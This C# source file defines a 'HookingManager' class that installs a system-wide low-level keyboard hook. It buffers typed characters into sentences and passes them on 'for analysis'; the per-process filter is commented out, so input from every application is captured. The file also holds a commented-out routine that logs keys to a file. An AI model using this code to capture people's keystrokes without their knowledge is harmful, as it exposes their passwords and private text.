namespace TrackerUtils
{

    using TrackerUtils.enums;


    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using System.Collections.Generic;

    public class HookingManager : IDisposable
    {



        private delegate int HookProc(int code, IntPtr wParam, IntPtr lParam);
        const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private HookProc _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private bool _disposed;
        // Define a delegate named SentenceCompleteHandler, to bubble up
        // a complete sentence for analysis
        public delegate void SentenceCompleteHandler(string message);

        // Define an Event based on the above Delegate
        public event SentenceCompleteHandler SendSentenceUp;

        private StringBuilder sentenceBuffer = new StringBuilder();

        public IntPtr HookID
        {
            get
            {
                return this._hookID;
            }
        }

        private List<String> _processesToMonitor = new List<string>();

        public void AddProcessToBeMonitored(string name)
        {
            if (!this._processesToMonitor.Contains(name))
                this._processesToMonitor.Add(name);
        }


        #region " --- Windows API declarations --- "

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetFocus(IntPtr hWnd);

        /// <summary>
        /// GetActiveWindow gets the active window for the calling thread. 
        /// If the calling thread does not own the foreground window, then GetActiveWindow returns NULL
        /// </summary>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetActiveWindow(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", EntryPoint = "GetModuleHandleW", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        #endregion


        public HookingManager()
        {
            _proc = HookCallback;
        }

        public HookingManager(List<String> processesToMonitor)
        {
            _proc = HookCallback;
            this._processesToMonitor = processesToMonitor;
        }

        public IntPtr Hook()
        {
            using (var p = Process.GetCurrentProcess())
            using (var curModule = p.MainModule)
            {
                // instead of global with 0 try to set up only a few IDs, the problem is when one starts a new application
                // after registration...
                // a global hook is easier but there is a lot to filter out...

                _hookID = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
                return _hookID;
            }
        }

        /// <summary>
        /// Callback that will be called on every keystroke intercepted by the hook
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private int HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            // We should filter first by executable name, so we do not capture a lot of garbage 
            //IntPtr hwnd = GetForegroundWindow();
            //uint pid;
            //GetWindowThreadProcessId(hwnd, out pid);
            //Process p = Process.GetProcessById((int)pid);
            //if (this._processesToMonitor.Contains(p.MainModule.FileName))
            //{
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // filter out codes
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == (int)VKCodes.VK_BACK)
                    if (sentenceBuffer.Length > 0)
                    sentenceBuffer.Remove(sentenceBuffer.Length - 1, 1);
                if (vkCode == (int)VKCodes.VK_OEM_PERIOD || vkCode == (int)VKCodes.VK_SPACE || (vkCode >= (int)VKCodes.VK_KEY_0 && vkCode < (int)VKCodes.VK_KEY_Z))
                {
                    var key = (Keys)vkCode;
                    if (key == Keys.Space)
                        sentenceBuffer.Append(" ");
                    else if (vkCode == (int)VKCodes.VK_OEM_PERIOD)
                        sentenceBuffer.Append(".");
                    else
                        sentenceBuffer.Append(key);
                    //using (var sw = new StreamWriter(Application.StartupPath + @"\log.txt", true))
                    //{
                    //    if (key == Keys.Space)
                    //        sw.Write(" ");
                    //    if (vkCode == (int)VKCodes.VK_OEM_PERIOD)
                    //        sw.Write(".");
                    //    else
                    //        sw.Write(key);
                    //}
                    if (key == Keys.OemPeriod)
                    {
                        SendSentenceUp?.Invoke(sentenceBuffer.ToString());
                        sentenceBuffer.Clear();
                    }
                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);

            //}
            //return CallNextHookEx(_hookID, nCode, wParam, lParam);


        }

        /// <summary>
        /// Unhook key logging
        /// </summary>
        /// <returns></returns>
        public bool Unhook() => UnhookWindowsHookEx(this._hookID);


        protected virtual void Dispose(bool disposing)
        {
            // If you need thread safety, use a lock around these 
            // operations, as well as in your methods that use the resource.
            if (!_disposed)
            {
                if (disposing)
                {
                    Unhook();
                }

                // Indicate that the instance has been disposed.
                _disposed = true;
            }
        }

        public void Dispose()
        {
            Dispose(true);

            // Use SupressFinalize in case a subclass
            // of this type implements a finalizer.
            GC.SuppressFinalize(this);
        }
    }
}
